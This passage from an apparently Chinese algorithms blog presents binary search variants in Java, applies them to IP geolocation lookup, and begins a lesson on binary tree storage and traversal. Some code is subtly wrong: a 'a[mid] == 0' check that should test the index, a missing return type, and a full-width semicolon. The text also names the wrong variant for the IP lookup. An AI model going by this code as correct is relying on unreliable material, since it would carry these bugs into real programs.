202.102.133.255]这个地址范围内，那我们就可以将这个IP地址范围对应的归属地”山东东营市”显示给用户了。</p>\n<p><strong>现在我的问题是，在庞大的地址库中逐一对比IP地址所在的区间，是非常耗时的。假设我们有12万条这样的IP区间与归属地的对应关系，如何快速定位出一个IP地址的归属地呢？</strong></p>\n<p>是不是觉得比较难？不要紧，等学完今天的内容，你就会发现这个问题其实很简单。</p>\n<p>上一节我讲了二分查找的原理，并且介绍了最简单的一种二分查找的代码实现。今天我们来讲几种二分查找的变形问题。</p>\n<p>不知道你有没有听过这样一个说法：”十个二分九个错”。二分查找虽然原理极其简单，但是想要写出没有bug的二分查找并不容易。</p>\n<p>康纳德·克努特(Donald E.Knuth) 在《计算机程序设计艺术》的第3卷《排序与查找》中说到”尽管第一个二分查找算法于1946年出现，然后第一个完全正确的二分查找算法实现直到1962年才出现”。</p>\n<p>你可能会说，我们上一节学的二分查找的代码实现并不难写啊。那是因为上一节讲的只是二分查找的一种最简单的情况，在不存在重复元素的有序数组中，查找给定值的元素。最简单的二分查找写起来确实不难，但是，二分查找的变形问题就没有那么好写了。</p>\n<p>二分查找的变形问题很多，我只选择几个典型的来讲解，其它你可以借助我今天讲的思路来分析。</p>\n<p>四种常见的二分查找的变形问题：</p>\n<ul>\n<li>查找第一个值等于给定值的元素</li>\n<li>查找最后一个值等于给定值的元素</li>\n<li>查找第一个大于等于给定值的元素</li>\n<li>查找最后一个小于给定值的元素</li>\n</ul>\n<p>需要特别说明一点，为了简化讲解，今天的内容，我都以数据是从小到大排列为前提，如果你要处理的数据是从大到小排列的，解决思路也是一样的。同时，我希望你最好先自己动手试着写一下这4个变形问题，然后再看看我的讲述，这样你就会对我说的”二分查找比较难写”有更加深刻的体会了。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"变体1：查找第一个值等于给定值的元素\"><a href=\"#变体1：查找第一个值等于给定值的元素\" class=\"headerlink\" title=\"变体1：查找第一个值等于给定值的元素\"></a>变体1：查找第一个值等于给定值的元素</h3></div><br></div>\n\n<p>上一节中的二分查找是最简单的一种，即有序数据集合中不存在重复的数据，我们在其中查找值等于某个给定值的数据。如果我们将这个问题稍微修改下，有序数据集合中存在重复的数据，我们希望找到第一个值等于给定值的数据，止痒之前的二分查找代码还能工作吗？</p>\n<p>比如下面这样一个有序数组，其中，a[5], a[6], a[7]的值都等于8，是重复的数据，我们希望找到第一个等于8的数据，也就是下标是5的元素。</p>\n<img src=\"/posts/2018-11-09-算法-二分查找-下/有序数组.jpg\">\n<p>如果我们用上一节课讲的二分查找的代码实现，首先拿8与区间的中间值a[4] 比较，8比6大，于是在下标5到9之间继续查找。下标5和9中间的位置是下标7，a[7]正好等于8，所以代码就返回了。</p>\n<p>尽管a[7]也等于8，但它并不是我们想找的第一个等于8的元素，因为第一个值等于8的元素是下标为5的元素。我们上一节讲的二分查找代码就无法处理这种情况了。所以针对这个变形问题，我们可以稍微改造上一节的代码。</p>\n<p>100个人写二分查找就会有100中写法。网上有很多关于变形二分查找的实现方法，有很多写的非常简洁，比如下面这个写法。但是，尽管简洁，理解起来却非常烧脑，也很容易写错。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">binarySearch01</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> low = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> high = n-<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(low &lt;= high) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = low + ((high-low)&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid] &gt; value)&#123;</span><br><span class=\"line\">\t\t\thigh = mid -<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tlow = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (low &lt; n &amp;&amp; a[low] == value) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> low;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看完之后，你是不是觉得很不好理解？如果你只是死记硬背这个写法，我敢保证，过不了几天，你就会全部忘光，再让你写，90%的可能会写错。所以，我换了一种实现方法，你看看是不是更容易理解。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch01</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> low=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> high = n-<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(low &lt;= high) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = low + ((high-low)&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (a[mid] &gt; value) &#123;</span><br><span class=\"line\">\t\t\thigh = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (a[mid] &lt; value) &#123;</span><br><span class=\"line\">\t\t\tlow = mid + <span class=\"number\">1</span>;\t\t\t</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(a[mid] == <span class=\"number\">0</span> || a[mid-<span class=\"number\">1</span>] != value) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\thigh = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我来稍微解释一下这段代码。a[mid] 跟要查找的value的大小关系有三种情况：大于、小于、等于。 对于a[mid]&gt;value的情况，我们需要更新high=mid-1；对于a[mid]&lt; value的情况，我们需要更新low=mid+1。这两点都好理解，那当a[mid]=value的时候该如何处理呢？</p>\n<p>如果我们查找的是任意一个值等于给定值的元素，当a[mid]等于要查找的值时，a[mid]就是我们要查找的元素。但是如果我们要查找的是第一个值等于给定值的元素，当a[mid]等于要查找的值时，我们就需要确认一下这个元素是不是第一个定于给定值的元素。</p>\n<p>我们重点看一下第12行代码。如果mid等于0，那这个元素已经是数组的第一个元素，那它肯定是我们要找的。如果mid不等于0，但a[mid]的前一个元素a[mid-1]不等于value，那也说明a[mid]就是我们要找的第一个值等于给定值的元素。</p>\n<p>如果经过检查之后发现a[mid]前面的一个元素a[mid-1]也等于value，那说明此时的a[mid]肯定不是我们要找的第一个值等于给定值的元素。那我们就更新high=mid-1，因为我们要查找的元素肯定出现在[low. mid-1]之间。</p>\n<p>对比上面的两段代码，是不是下面那种更好理解？实际上，很多人觉得变形的二分查找很难，主要原因是追求第一种那样完美、简洁的写法。而对于我们做工程开发的人来说，代码易读懂、没Bug，其实更重要。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"变体2：查找最后一个值等于给定值的元素\"><a href=\"#变体2：查找最后一个值等于给定值的元素\" class=\"headerlink\" title=\"变体2：查找最后一个值等于给定值的元素\"></a>变体2：查找最后一个值等于给定值的元素</h3></div><br></div>\n\n<p>前面的问题是查找第一个值等于给定值的元素，我现在把问题稍微修改一下，查找最后一个只等于给定值的元素，又该如何做呢？</p>\n<p>如果你掌握了前面的写法，那这个问题你应该轻松就能解决，你可以先试着写一下，然后跟我写的对比一下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch02</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> low = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> high = n-<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (low &lt;= high) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = low + ((high-low)&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid]&lt;value) &#123;</span><br><span class=\"line\">\t\t\tlow = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (a[mid] &gt; value)&#123;</span><br><span class=\"line\">\t\t\thigh = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (mid == n-<span class=\"number\">1</span> || a[mid + <span class=\"number\">1</span>] != value )&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们还是重点看一下11行代码。如果a[mid]已经是这个数组中最后一个元素了，那它肯定是我么要找的；如果a[mid+1]不等于value，那也说明a[mid]就是我们要找的最后一个值等于给定值的元素。</p>\n<p>如果我们经过检查之后，发现a[mid]后面的一个元素a[mid+1]也等于value，那说明当前的元素并不是最后一个只等于给定值的元素，我们更新low=mid+1，因为要找的元素肯定在[mid+1, high]之间。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"变体3：查找第一个大于等于给定值的元素\"><a href=\"#变体3：查找第一个大于等于给定值的元素\" class=\"headerlink\" title=\"变体3：查找第一个大于等于给定值的元素\"></a>变体3：查找第一个大于等于给定值的元素</h3></div><br></div>\n\n<p>现在我们来看另一类变形问题。在有序数组中，查找第一个大于等于给定值的元素。比如数组中存储的这样一个序列：3,4,6,7,10.如果查找第一个大于等于5的元素，那就是6。</p>\n<p>实际上，实现的思路跟上面两种变形问题的实现思路类似，代码写起来甚至更简洁。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch03</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> low = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> high = n -<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(low&lt;=high)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = low + ((high - low) &gt;&gt; <span class=\"number\">1</span>); </span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid] &gt;= value) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (mid == <span class=\"number\">0</span> || a[mid-<span class=\"number\">1</span>] &lt; value) &#123;</span><br><span class=\"line\">\t\t\t \t<span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">\t\t\t &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t \thigh = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t &#125;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tlow = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果a[mid] 小于要查找的值value，那要查找的值肯定在[mid+1, high]之间，所以我们更新low = mid + 1。</p>\n<p>对于a[mid] 大于等于给到你告知value的情况，我们要先看下这个a[mid]是不是我们要找的第一个值大于等于给定值的元素。如果a[mid]的前面已经没有元素，或者前面一个元素小于要查找的值value，那a[mid]就是我们要找的元素，这段逻辑对应的代码是第7行。</p>\n<p>如果a[mid-1]也大于等于要查找的值value，那说明我们要查找的元素在[low, mid-1]之间，所以我们将high更新为mid-1。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"变体3：查找最后一个值小于等于给定值的元素\"><a href=\"#变体3：查找最后一个值小于等于给定值的元素\" class=\"headerlink\" title=\"变体3：查找最后一个值小于等于给定值的元素\"></a>变体3：查找最后一个值小于等于给定值的元素</h3></div><br></div>\n\n<p>现在，我们来看最后一种二分查找的变形问题，查找最后一个值小于等于给定值的元素。比如，数组中存储了这样一组数据：3,5,6,8,9,10。最后一个小于等于7的元素是6.是不是有点类似上面那一种？实际上实现思路也是类似的。</p>\n<p>有了前面的基础，你完全可以自己写出来了，所以我就不详细分析了。你可以自己写一下然后对比一下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch04</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> low = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> high = n-<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(low &lt;= high) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = low + ((high - low) &gt;&gt; <span class=\"number\">1</span>); </span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (a[mid] &lt;= value) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (mid == n-<span class=\"number\">1</span> || a[mid + <span class=\"number\">1</span>] &gt; value) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">if</span> (a[mid] &gt; value) &#123;</span><br><span class=\"line\">\t\t\thigh = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -<span class=\"number\">1</span>；</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>好了，现在我们来看开篇的问题：如何快速定位出一个IP地址的归属地？</p>\n<p>现在这个问题应该很简单了。如果IP区间与归属地的对应关系不经常更新，我们可以预先处理这12万条数据，让其按照起始IP从小到大排序。如何来排序呢？我们知道IP地址可以转化为32位的整型数，所以我们可以将起始IP地址按照对应的整型值的大小关系，从小到大进行排序。</p>\n<p>然后这个问题就可以转化为我们刚讲的第四种变形问题”在有序数组中，查找最后一个等于某个给定值的元素”了。</p>\n<p>当我们要查找某个IP归属地时，我们可以先通过二分查找，找到最后一个起始IP小于等于这个IP的IP区间，如果在，我们就取出对应的归属地显示；如果不在，就返回未查找到。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>上一节说过，凡是用二分查找能解决的，绝大部分我们更倾向于用散列表和二叉查找树。即便是二分查找在内存使用上更节省，但是毕竟内存如此紧缺的情况并不多，那二分查找真的没什么用处了吗？</p>\n<p>实际上，上一节讲的求”值等于给定值”的二分查找缺失不怎么会被用到，二分查找更适合用在”近似”查找问题，在这类问题上，二分查找的优势更明显。比如今天讲的这几种变体问题，用其他数据结构，如散列表、二叉树，就比较难实现了。</p>\n<p>变体的二分查找算法写起来非常烧脑，很容易因为细节处理不好而产生bug，这些容易出错的细节有：<strong>终止条件、区间上下界更新方法、返回值选择</strong>。所以今天讲的内容你最好能自己实现一遍，对锻炼编码能力、逻辑思维、写出bug free代码，会很有帮助。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>我们今天讲的都是非常规的二分查找问题，今天的思考题也是一个非常规的二分查找问题。如果有序数组是一个循环有序数组，比如4,5,6,1,2,3。针对这种情况，如何实现一个求”值等于给定值”的二分查找算法呢？</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-二叉树基础（上）：什么样的二叉树适合用数组来存储？","date":"2019-09-17T08:23:25.000Z","_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n前面我们讲的都是线性表结构，栈、队列等等。今天我们将一种非线性表结构，树。树这种数据结构比线性表的数据结构要复杂的多，内容也比较多，分了四节来讲解。\n\n| 章节 | 内容 |\n|------|-----|\n| 二叉树（上） | 树、二叉树|\n| 二叉树（下） | 二叉查找树|\n| 红黑树      | 平衡二叉查找树、红黑树|\n| 递归树      | 递归树|\n\n\n在正式开始今天内容之前，我们还是先看一道思考题：二叉树有哪几种存储方式？什么样的二叉树适合用数组来存储？\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 树（Tree）\n{% endnote %}\n</div>\n\n我们首先来看，什么是树？再完备的定义，也不如图直观，我们可以从以下几颗树来看看，树这种数据结构有什么特征？\n\n{% asset_img 01.jpg %}\n\n你有没有发现，树这种数据结构很像我们现实生活中的“树”，这里面每个元素我们叫做“节点”，用来连线相邻节点之间的关系，我们叫做“父子关系”\n\n比如下面这幅图，A节点就是B节点的父节点，B节点是A节点的子节点。B、C、D这三个节点的父节点是同一个节点，所以他们之间互称为兄弟节点。我们把没有父节点的节点叫做根节点，也就是图中的节点E，我们把没有子节点的节点叫做叶子节点或者叶节点。比如途中的G、H、I、J、K、L都是叶子节点。\n\n{% asset_img 02.jpg %}\n\n除此之外，关于书，还有三个比较相似的概念：**高度**、**深度**、**层**。他们的定义是这样的：\n\n* 节点的高度= 节点到叶子节点的最长路径（边数）\n* 节点的深度 = 根节点到这个节点所经历的边的个数\n* 节点的层数 = 节点的深度 + 1\n* 树的高度 = 根节点的高度\n\n这三个概念的定义比较容易混淆，描述起来也比较空洞，我举个例子说明一个，你一看就应该能明白\n\n{% asset_img 03.jpg %}\n\n记住这几个概念，我还有一个小窍门，就是类比高度、深度、层这几个名次在我们生活中的意义。\n\n在我们的生活中，“高度”这个概念，其实就是从下往上度量，比如我们要度量第10层楼的高度、第13层楼的高度，起点都是地面。所以树这种数据结构的高度也是一样的，从最底层开始计算，并且计数的起点是0.\n\n\n“深度”这个概念在生活中是从上往下度量的，比如水中鱼的深度，是从海平面开始度量的，所以树这种数据结构的深度也是类似的，从根节点开始度量，并且计数起点是0.\n\n\n“层”跟深度的计算类似，不过，计算的起点是1，也就是说根节点位于第一层。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 二叉树（Binary Tree）\n{% endnote %}\n</div>\n\n树的机构多种多样，不过我们最常用的还是二叉树。\n\n二叉树，顾名思义，每个节点最多有两个“叉”，也就是两个子节点，分别是左子节点和右子节点。不过，二叉树并不要求每个节点都有两个子节点，有的节点只有左子节点，有的节点只有右子节点。我画的这几个都是二叉树，以此类推，你可以想象以下四叉树、八叉树是什么样子。\n\n{% asset_img 04.jpg %}\n\n这个图里面，有两个比较特殊的二叉树，分别是编号2和编号3的二叉树。\n\n其中，编号为2的二叉树中，叶子节点全都在最底层，除了叶子节点外，每个节点都有左右子节点，这种二叉树就叫做**满二叉树**。\n\n编号为3的二叉树中，叶子节点都在最下两层，最后一层的叶子节点都靠左排列，并且除了最后一层，其他层的节点个数都要达到最大，这种二叉树叫做**完全二叉树**。\n\n满二叉树很好理解，也很好识别，但是完全二叉树，有的人可能就分不清了。\n\n你可能会说，满二叉树的特征非常明显，我们把它单独拎出来，这个可以理解，但是完全二叉树的特征不怎么明显，但从长相上来看，完全二叉树并没有特殊的地方，更像是芸芸众树中的一种。\n\n那我们为什么还要特意把它拎出来呢？为什么偏偏把最后一层的叶子节点靠左排列的叫完全二叉树？如果靠右排列就不能叫完全二叉树了吗？这个定义的由来或者说目的在哪里？\n\n要理解完全二叉树的由来，我们需要先了解，**如何表示（或者存储）一颗二叉树**？\n\n想要存储一颗二叉树，我们有两种方法，一种是基于指针或者引用的二叉链式存储法，一种是基于数组的顺序存储法。\n\n我们先来看比较简单、直观的链式存储法。从图中你应该可以很清楚的看到，每个节点有三个字段，其中一个存储数据，另外两个指向左右子节点的指针。我们只要拎住根节点，就可以通过左右子节点的指针，把整颗树都串起来，这种存储方式我们比较常用。大部分二叉树的代码都是通过这种方式实现的。\n\n\n我们再来看，基于数组的**顺序存储法**，我们把根节点存储在下标i=1的位置，那左子节点存储在下标为2*i=2的位置，右子节点存储在2*i+1=3的位置。依次类推，B节点的左子节点存储在2*i=2*2=4的位置，右子节点存储在2*i+1=2*2+1=5的位置。\n\n我来总结一下，如果节点X存储在数组中下标为i的位置，下标为2*i的位置存储的就是左子节点，下标为2*1+1的位置存储的就是右子节点。反过来，下标为i/2的位置存储的就是它的父节点。通过这种方式，我们只要知道根节点存储的位置（一般情况下，为了方便计算子节点，根节点会存储在下标为1的位置），这样就可以通过下标计算，把整颗树都串起来。\n\n不过，我刚刚举的例子是一颗完全二叉树，所有仅仅“浪费”了一个下标为0的存储位置。如果是非完全二叉树，其实会浪费比较多的数组存储空间，你可以看我举的下面的例子。\n\n所以如果某棵二叉树是完全二叉树，那用数组存储无疑是最节省内存的一种方式。因为数组的存储方式并不需要像链式存储法那样，要存储额外的左右子节点的指针。这也是为什么完全二叉树要单独拎出来的原因，也是为什么完全二叉树要求最后一层的子节点都靠左的原因。\n\n当我们讲到堆和堆排序的时候，你会发现，堆其实就是一种完全二叉树，最常用的存储方式就是数组。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 二叉树的遍历\n{% endnote %}\n</div>\n\n前面我讲了二叉树的基本定义和存储方法，现在我们来看二叉树中非常重要的操作，二叉树的遍历。这也是非常常见的面试题。\n\n如何将所有节点都遍历打印出来呢？经典的方法有三种，**前序遍历、中序遍历、后序遍历**。其中，前、中、后序，表示的是节点与它的左右子树节点遍历打印的先后顺序。\n\n* 前序遍历是指，对于树中的任意节点来说，先打印这个节点，然后再打印它的左子树，最后打印它的右子树。\n\n* 中序遍历是指，对于树中的任意节点来说，先打印它的左子树节点，在打印它本身，最后打印它的右子树节点。\n\n* 后序遍历是指，对于树中的任意节点来说，先打印它的左子树节点，在打印它的右子树节点，最后打印这个节点本身。\n\n\n实际上，二叉树的前、中、后序遍历就是一个递归的过程。比如，前序遍历，其实就是先打印根节点，然后再递归地打印左子树，最后递归的打印右子树。\n\n写递归代码的关键，就是看能不能写出递推公式，而写递推公式的关键，就是要看解决问题A，就假设子问题B、C已经解决，然后再来看如何利用B、C来解决A。所以，我们可以把前、中、后序遍历的递推公式都写出来。\n\n```\n前序遍历的递推公式\npreOrder(r) = print r -> preOrder(r->left) -> preOrder(r->right)\n\n中序遍历的递推公式\ninOrder(r) = inOrder(r->left) -> print r -> inOrder(r->right)\n\n后序遍历的递推公式\npostOrder(r) = postOrder(r->left) -> postOrder(r->right) -> print r\n\n```\n\n有了递推公式，代码写起来就简单多了，这三种遍历方式的代码，我都写出来了，你可以看看。\n\n```\nvoid preOrder(Node* root) {\n    if (root == null) return;\n\n    print root; // 伪代码，表示打印root节点\n    preOrder(root->left)\n    preOrder(root->right)\n}\n\nvoid inOrder(Node* root) {\n    if(root == null) return;\n    inOrder(root->left);\n    print  root;\n    inOrder(root->right)\n}\n\nvoid postOrder(Node* root) {\n    if(root == null) return;\n    postOrder(root->left);\n    postOrder(root->right)\n    print root;\n}\n```\n\n二叉树的前、中、后序遍历是不是很简单？你知道二叉树遍历的时间复杂度是多少吗？我们一起来看看。\n\n\n从我前面画的前、中、后序遍历的顺序图，可以看出来，每个节点最多被访问两次，所以遍历的时间复杂度，跟节点的个数n成正比，也就是说二叉树的遍历的时间复杂度是O(n).\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇|内容小姐\n{% endnote %}\n</div>\n\n今天，讲了一种非线性表数据结构，树。关于树，有几个比较常用的概念你需要掌握，那就是跟节点、叶子节点、父节点、子节点、兄弟节点，还有节点的高度、深度、层数，以及树的高度。\n\n我们平时最常用的就是二叉树。二叉树的每个节点最多有两个子节点，分别是左子节点和右子节点。二叉树中，有两个比较特殊的树，满二叉树和完全二叉树。满二叉树是完全二叉树的一中特殊情况。\n\n二叉树既可以用链式存储，也可以用数组顺序存储。数组顺序存储的方式比较适合完全二叉树，其他类型的二叉树用数组存储会比较浪费存储空间。除此之外，二叉树里非常重要的操作就是前、中、后序遍历操作，遍历的操作时间复杂度是O(n)，你需要理解并能用递归代码来实现，\n\n### 课后思考\n\n1. 